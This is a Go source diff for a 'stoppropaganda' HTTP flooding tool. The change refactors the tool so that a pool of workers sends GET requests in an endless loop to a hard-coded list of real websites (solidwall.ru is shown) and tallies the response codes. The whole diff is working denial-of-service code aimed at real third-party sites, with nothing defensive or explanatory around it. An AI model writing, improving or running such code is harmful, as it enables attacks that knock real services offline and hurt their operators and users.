@@ -1,6 +1,7 @@
 package stoppropaganda
 
 import (
+	"net"
 	"net/url"
 	"strings"
 	"sync"
@@ -328,13 +329,11 @@ var targetWebsites = map[string]struct{}{
 	"https://solidwall.ru":      {},
 }
 
-var websites = map[string]*Website{}
-
 type Website struct {
-	Requests      uint   `json:"requests"`
-	Errors        uint   `json:"errors"`
-	LastErrorMsg  string `json:"last_error_msg"`
-	WorkersStatus string `json:"workers_status"`
+	Requests     uint   `json:"requests"`
+	Errors       uint   `json:"errors"`
+	LastErrorMsg string `json:"last_error_msg"`
+	Status       string `json:"status"`
 
 	Counter_code100 uint `json:"status_100"`
 	Counter_code200 uint `json:"status_200"`
@@ -342,112 +341,167 @@ type Website struct {
 	Counter_code400 uint `json:"status_400"`
 	Counter_code500 uint `json:"status_500"`
 
+	host string
+
 	mux            *sync.Mutex
 	pauseMux       *sync.Mutex
 	paused         bool
 	dnsLastChecked time.Time
+
+	req *fasthttp.Request
 }
 
-func (ws *Website) Start(endpoint string) {
-	// Extract domain out of address
-	websiteURL, err := url.Parse(endpoint)
-	if err != nil {
-		panic(err)
-	}
+var websites = map[string]*Website{}
 
-	ws.WorkersStatus = "Initializing"
-	ws.pauseMux = &sync.Mutex{}
-	ws.paused = false
-	ws.dnsLastChecked = time.Now().Add(-1 * VALIDATE_DNS_EVERY) // this forces to validate on first run
+func startWebsites() {
+	for website := range targetWebsites {
+		websiteURL, err := url.Parse(website)
+		if err != nil {
+			panic(err)
+		}
 
-	// Create request
-	req := fasthttp.AcquireRequest()
-	req.SetRequestURI(endpoint)
-	req.Header.SetMethod(fasthttp.MethodGet)
-	req.Header.Set("Host", websiteURL.Host)
-	req.Header.Set("User-Agent", *flagUserAgent)
-	req.Header.Set("Accept", "*/*")
+		newReq := fasthttp.AcquireRequest()
+		newReq.SetRequestURI(website)
+		newReq.Header.SetMethod(fasthttp.MethodGet)
+		newReq.Header.Set("Host", websiteURL.Host)
+		newReq.Header.Set("User-Agent", *flagUserAgent)
+		newReq.Header.Set("Accept", "*/*")
 
-	f := func() {
-		// Create response
-		resp := fasthttp.AcquireResponse()
-
-		for {
-			ws.pauseMux.Lock()
-			if time.Since(ws.dnsLastChecked) >= VALIDATE_DNS_EVERY {
-				ipAddresses, err := getIPs(websiteURL.Host)
-				ws.dnsLastChecked = time.Now()
-
-				if err != nil {
-					ws.mux.Lock()
-					switch {
-					case strings.HasSuffix(err.Error(), "Temporary failure in name resolution"):
-						ws.WorkersStatus = "Your DNS servers unreachable or returned an error"
-					case strings.HasSuffix(err.Error(), "no such host"):
-						ws.WorkersStatus = "Domain does not exist"
-					case strings.HasSuffix(err.Error(), "No address associated with hostname"):
-						ws.WorkersStatus = "Domain does not have any IPs assigned"
-					default:
-						ws.WorkersStatus = err.Error()
-					}
-					ws.paused = true
-					ws.mux.Unlock()
-
-					time.Sleep(5 * time.Minute)
-					ws.pauseMux.Unlock()
-					continue
-				}
-
-				if containsPrivateIP(ipAddresses) {
-					ws.mux.Lock()
-					ws.WorkersStatus = "Private IP detected"
-					ws.paused = true
-					ws.mux.Unlock()
-
-					time.Sleep(5 * time.Minute)
-					ws.pauseMux.Unlock()
-					continue
-				}
-
-				ws.mux.Lock()
-				ws.WorkersStatus = "Running"
-				ws.paused = false
-				ws.mux.Unlock()
-			}
-			ws.pauseMux.Unlock()
-
-			// Perform request
-			err := httpClient.DoTimeout(req, resp, *flagTimeout)
-			if err != nil {
-				ws.mux.Lock()
-				ws.Requests++
-				ws.Errors++
-				ws.LastErrorMsg = err.Error()
-				ws.mux.Unlock()
-				continue
-			}
-			responseCode := resp.StatusCode()
-
-			// Increase counters
-			ws.mux.Lock()
-			ws.Requests++
-			switch {
-			case responseCode < 200:
-				ws.Counter_code100++
-			case responseCode < 300:
-				ws.Counter_code200++
-			case responseCode < 400:
-				ws.Counter_code300++
-			case responseCode < 500:
-				ws.Counter_code400++
-			default:
-				ws.Counter_code500++
-			}
-			ws.mux.Unlock()
+		websites[website] = &Website{
+			host:           websiteURL.Host,
+			Status:         "Initializing",
+			mux:            &sync.Mutex{},
+			pauseMux:       &sync.Mutex{},
+			paused:         false,
+			dnsLastChecked: time.Now().Add(-1 * VALIDATE_DNS_EVERY), // this forces to validate on first run
+			req:            newReq,
 		}
 	}
 
+	websitesChannel := make(chan *Website, *flagWorkers)
+
+	// Spawn workers
 	for i := 0; i < *flagWorkers; i++ {
-		go f()
+		go runWebsiteWorker(websitesChannel)
 	}
+
+	// Issue tasks
+	go func() {
+		for {
+			for _, website := range websites {
+				websitesChannel <- website
+			}
+		}
+	}()
+}
+
+func runWebsiteWorker(c chan *Website) {
+	// Each worker has it's own response
+	req := fasthttp.AcquireRequest()
+	resp := fasthttp.AcquireResponse()
+
+	for {
+		website := <-c
+		website.req.CopyTo(req) // https://github.com/valyala/fasthttp/issues/53#issuecomment-185125823
+
+		website.pauseMux.Lock()
+		if time.Since(website.dnsLastChecked) >= VALIDATE_DNS_EVERY {
+			ipAddresses, err := getIPs(website.host)
+			website.dnsLastChecked = time.Now()
+
+			if err != nil {
+				website.mux.Lock()
+				switch {
+				case strings.HasSuffix(err.Error(), "Temporary failure in name resolution"):
+					website.Status = "Your DNS servers unreachable or returned an error"
+				case strings.HasSuffix(err.Error(), "no such host"):
+					website.Status = "Domain does not exist"
+				case strings.HasSuffix(err.Error(), "No address associated with hostname"):
+					website.Status = "Domain does not have any IPs assigned"
+				default:
+					website.Status = err.Error()
+				}
+				website.paused = true
+				website.mux.Unlock()
+
+				time.Sleep(5 * time.Minute)
+				website.pauseMux.Unlock()
+				continue
+			}
+
+			if containsPrivateIP(ipAddresses) {
+				website.mux.Lock()
+				website.Status = "Private IP detected"
+				website.paused = true
+				website.mux.Unlock()
+
+				time.Sleep(5 * time.Minute)
+				website.pauseMux.Unlock()
+				continue
+			}
+
+			website.mux.Lock()
+			website.Status = "Running"
+			website.paused = false
+			website.mux.Unlock()
+		}
+		website.pauseMux.Unlock()
+
+		// Perform request
+		err := httpClient.DoTimeout(req, resp, *flagTimeout)
+		if err != nil {
+			website.mux.Lock()
+			website.Requests++
+			website.Errors++
+			website.LastErrorMsg = err.Error()
+			website.mux.Unlock()
+			continue
+		}
+		responseCode := resp.StatusCode()
+
+		// Increase counters
+		website.mux.Lock()
+		website.Requests++
+		switch {
+		case responseCode < 200:
+			website.Counter_code100++
+		case responseCode < 300:
+			website.Counter_code200++
+		case responseCode < 400:
+			website.Counter_code300++
+		case responseCode < 500:
+			website.Counter_code400++
+		default:
+			website.Counter_code500++
+		}
+		website.mux.Unlock()
+	}
+}
+
+func getIPs(host string) (ips []net.IP, err error) {
+	ipAddresses := make([]net.IP, 0, 1)
+	addr := net.ParseIP(host)
+	if addr == nil {
+		ips, err := net.LookupIP(host)
+		if err != nil {
+			return nil, err
+		}
+		for _, ip := range ips {
+			if ipv4 := ip.To4(); ipv4 != nil {
+				ipAddresses = append(ipAddresses, ipv4)
+			}
+		}
+	} else {
+		ipAddresses = append(ipAddresses, addr)
+	}
+	return ipAddresses, nil
+}
+
+func containsPrivateIP(ips []net.IP) bool {
+	for _, ip := range ips {
+		if ip.IsPrivate() || ip.IsLoopback() {
+			return true
+		}
+	}
+	return false
 }
